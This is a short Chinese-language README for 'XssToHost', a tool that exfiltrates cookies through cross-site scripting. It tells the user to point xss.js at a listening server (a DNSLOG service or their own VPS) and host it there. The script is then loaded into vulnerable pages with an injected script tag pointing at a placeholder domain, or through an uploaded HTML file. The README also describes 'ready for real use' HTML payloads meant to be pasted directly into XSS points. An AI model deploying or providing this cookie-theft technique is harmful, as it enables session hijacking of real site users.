# XssToHost

通过js跨域请求到DNSLOG平台或自己的VPS主机，并实现cookie外带  

## Usage 

1.将xss.js中的http地址改为带有监听功能的服务器，比如DNSLOG或者开了监听的VPS  
2.将xss.js部署在自己的VPS上  
3.当可以打xss时，可用

```html
<script src="http://exmaple.com/xss.js"></script>
```

方式远程加载此文件  
4.如遇到可上传HTML并解析的情况，可将xss.html上传到目标页面，远程加载xss.js  

5.xss2.html与xssfish.html为实战型，修改相关域名直接将html内的语句复制到有xss位置的地方即可
